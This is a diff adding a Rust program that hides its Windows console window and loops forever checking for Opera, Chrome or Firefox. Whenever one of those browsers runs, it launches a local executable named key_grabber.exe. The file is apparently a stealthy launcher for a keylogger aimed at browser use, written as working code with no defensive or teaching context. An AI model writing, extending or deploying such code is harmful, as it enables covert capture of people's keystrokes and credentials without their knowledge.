@@ -1,0 +1,55 @@
+use sysinfo::{get_current_pid, ProcessExt, System, SystemExt};
+use std::process::Command;
+
+fn hide_console_window() 
+{
+    use std::ptr;
+    use winapi::um::wincon::GetConsoleWindow;
+    use winapi::um::winuser::{ShowWindow, SW_HIDE};
+
+    let window = unsafe {GetConsoleWindow()};
+    if window != ptr::null_mut() {
+        unsafe {
+            ShowWindow(window, SW_HIDE);
+        }
+    }
+}
+
+fn gets_process(pid: &str)
+{   
+    let _current_p = get_current_pid();
+    let p = System::new_all();
+    for _proc in p.processes_by_exact_name(pid)
+    {
+        let is_up = _proc.name();
+        if is_up == "opera.exe"
+        {
+            let _start_p = Command::new("c:/Users/damar/.cargo/roggler/target/debug/key_grabber.exe")
+                .spawn()
+                .expect("NONE");
+            
+        }else if is_up == "chrome.exe"{
+            let _start_p = Command::new("c:/Users/damar/.cargo/roggler/target/debug/key_grabber.exe")
+                .spawn()
+                .expect("NONE");
+
+        }else if is_up == "firefox.exe" {
+            let _start_p = Command::new("c:/Users/damar/.cargo/roggler/target/debug/key_grabber.exe")
+                .spawn()
+                .expect("NONE");
+        
+        }else{
+            let _stopping = 0x0;
+        }
+    }
+}
+
+fn main()
+{        
+    hide_console_window();
+    loop {
+        gets_process("opera.exe");
+        gets_process("chrome.exe");
+        gets_process("firefox.exe");
+    }
+}
